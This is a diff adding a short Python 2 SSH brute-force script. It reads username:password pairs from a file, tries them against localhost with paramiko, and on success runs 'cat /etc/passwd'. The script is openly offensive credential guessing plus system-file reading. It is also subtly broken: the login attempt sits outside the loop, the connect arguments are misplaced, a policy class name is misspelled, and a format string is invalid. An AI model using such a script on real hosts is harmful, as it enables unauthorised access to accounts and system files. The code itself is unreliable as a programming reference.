@@ -1,0 +1,28 @@
+#!/usr/bin/env python
+
+import paramiko
+import sys
+
+fd=open(sys.argv[1],'r')
+
+for usr_pwd in fd.readlines():
+        usrpwd=usr_pwd.strip().split(':')
+
+
+ssh=paramiko.SSHClient()
+try:
+
+        ssh.connect('localhost',usrpwd[0],usrpwd[1])
+        ssh.set_missing_host_key_policy(paramiko.Autopolicy())
+        stdin,stdout,stderr=ssh.exec_command('cat /etc/passwd')
+except paramiko.AuthenticationException:
+        print "[-] username %s and password %s incorrect "%(usrpwd[0],usrpwd[1])
+else:
+        print "[++] username %s and password %S is correct"%(usrpwd[0],usrpwd[1])
+
+for line in stdout.readlines():
+        print line.strip()
+
+
+ssh.close()
+            
